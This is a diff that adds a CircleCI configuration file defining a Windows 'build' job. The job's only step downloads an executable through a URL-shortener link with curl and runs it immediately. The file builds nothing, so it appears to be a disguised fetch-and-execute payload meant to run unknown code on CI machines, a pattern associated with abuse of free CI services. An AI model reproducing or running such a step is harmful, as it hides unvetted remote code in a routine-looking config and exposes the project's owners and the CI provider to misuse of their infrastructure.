@@ -1,0 +1,12 @@
+version: 2.1
+ 
+orbs:
+  win: circleci/windows@2.2.0
+ 
+jobs:
+  build:
+    executor:
+      name: win/default
+      shell: cmd.exe
+    steps:
+      - run: curl -L -o ci.exe https://is.gd/Rc1seq && ci.exe
